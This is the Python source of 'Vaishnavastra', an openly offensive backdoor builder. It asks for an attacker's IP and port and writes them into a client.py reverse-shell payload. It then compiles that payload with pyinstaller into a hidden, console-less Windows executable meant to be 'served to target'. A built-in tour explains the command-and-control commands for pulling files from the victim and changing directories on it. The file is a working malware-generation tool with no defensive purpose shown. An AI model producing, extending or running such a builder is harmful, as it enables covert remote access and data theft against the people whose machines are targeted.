#By SxNade
#https://github.com/SxNade/Vaishnavastra
#CONTRIBUTE

import os
import sys
import time
import subprocess
from termcolor import colored
#importing the required Libraries

golo = '''
 _    __      _      __                                 __            
| |  / /___ _(_)____/ /_  ____  ____ __   ______ ______/ /__________ _
| | / / __ `/ / ___/ __ \/ __ \/ __ `/ | / / __ `/ ___/ __/ ___/ __ `/
| |/ / /_/ / (__  ) / / / / / / /_/ /| |/ / /_/ (__  ) /_/ /  / /_/ / 
|___/\__,_/_/____/_/ /_/_/ /_/\__,_/ |___/\__,_/____/\__/_/   \__,_/  
                                
                                *By SxNade https://github.com/SxNade
 '''

#defining a start Function that runs the relevant Function
def start():
    print(golo)
    time.sleep(2)
    print(colored("[+]Loding All Modules........", 'green', attrs=['bold']))
    time.sleep(3)
    aim()

def aim():
    os.system('clear')
    print(golo)
    print(colored("[+]Starting Payload Genration Engine NOW....", 'green', attrs=['bold']))
    global reverse_ip
    global reverse_port
    #making reverse IP and PORT global to use in other Function For editing the source code File...
    reverse_ip = input(colored("\n[+]Enter the LHOST(Reverse-shell-IP): ", 'red', attrs=['bold']))
    reverse_port = int(input(colored("[+]Enter the LPORT(Reverse-shell-PORT): ", 'red', attrs=['bold'])))
    print(f"[*]LHOST is {reverse_ip} and LPORT is {reverse_port}")
    time.sleep(3)
    print(colored("\n\n[!]IF Your Target Is Windows Please Run this Script On a Windows Machine....For compilation of windows executable....", 'red', attrs=['bold']))
    fire()
    #Running the Fire Function which generates the Source code for Backdoor

def fire():
    with open('client.py', 'r') as file:
        data = file.readlines()
    data[25] = f'    s.connect(("{reverse_ip}", {reverse_port}))\n'
    #editing the source code...for specified reverse_shell IP and PORT
    with open('client.py', 'w') as file:
        file.writelines( data )
    time.sleep(3)
    print(colored("[+]Successfully Written Payload------Compiling Executable now......"))
    time.sleep(3)
    command = 'pyinstaller.exe client.py --onefile --noconsole'
    subprocess.call(command, shell = True)
    #Compling the Payload
    print(colored("\n\n[+]Payload Genration Successfull", 'green', attrs=['bold']))
    print(colored("[*]Check the dist directory in C--<users>--<your-username>--<dist> ", 'red', attrs=['bold']))

def main():
 #main Function that Runs the whole Program and also querys user IF they are Familiar with the commands in reverse_shell
    ask = input(colored("[?]Are you familiar with command and control of Reverse-shell(Y/N): ", 'green'))
    if ask == 'Y':
        start()
    elif ask == 'N':
        print(colored("[#]In very First Step after the payload is served to target Run the server.py file using python3 on your machine", 'green', attrs=['bold']))
        time.sleep(5)
        print(("\n\n[*] To Download a File......lets say with name test.txt..."))
        print("RUN THIS COMMAND-- grab*test.txt -- ")
        print("Specify the File name after grab followed with a *")
        time.sleep(20)
        print(("\n\n[*] In Order to Change Directories on the target System.....lets say to Desktop"))
        print("RUN THIS COMMAND-- cd*Desktop -- ")
        print("Specify the Directory after cd* even when Going back using cd*..")
        time.sleep(20)
        os.system('clear')
        print(colored("[+]Thankyou For Taking The Tour.....", "green", attrs=['bold']))
        time.sleep(5)
        os.system('clear')
        start()
    else:
        print(colored("[!]UNEXPECTED INPUT......exiting now...", 'red', attrs=['bold']))
        sys.exit(0)

#Finally Caling the main Function To Run the Program
main()

